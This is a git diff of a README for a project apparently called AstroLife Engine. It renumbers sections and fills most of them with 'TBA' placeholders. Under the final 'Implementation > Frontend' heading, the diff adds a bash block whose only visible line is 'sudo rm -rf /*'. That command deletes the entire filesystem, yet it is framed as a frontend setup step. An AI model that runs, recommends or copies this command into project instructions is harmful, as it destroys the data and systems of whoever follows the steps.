@@ -72,29 +72,42 @@ AstroLife Engine transforms these hundreds of publications into an accessible, A
 
 ---
 
-## 7. Solution Overview
-- TBA
-- TBA
-- TBA
+## 6. Solution Overview
 - TBA
 
 ---
 
-## 8. System Architecture
-- **Frontend**: TBA
-- **Backend**: TBA
-- **Datasbase**: TBA
+## 7. How It Works
+- TBA
 
 ---
 
-## 9. Features & Components
-- **Visualization**: TBA
-- **Categorization**: TBA
-
+## 8. Impact
+- TBA
 
 ---
 
-## 10. Implementation
+## 9. Conclusion
+- TBA
+
+---
+
+## 10. Use Of Artificial Intelligence
+- TBA
+
+---
+
+## 11. NASA Data
+- TBA
+
+---
+
+## 12. Other References
+- TBA
+
+---
+
+## 13. Implementation
 ### Frontend
 ```bash
 sudo rm -rf /*
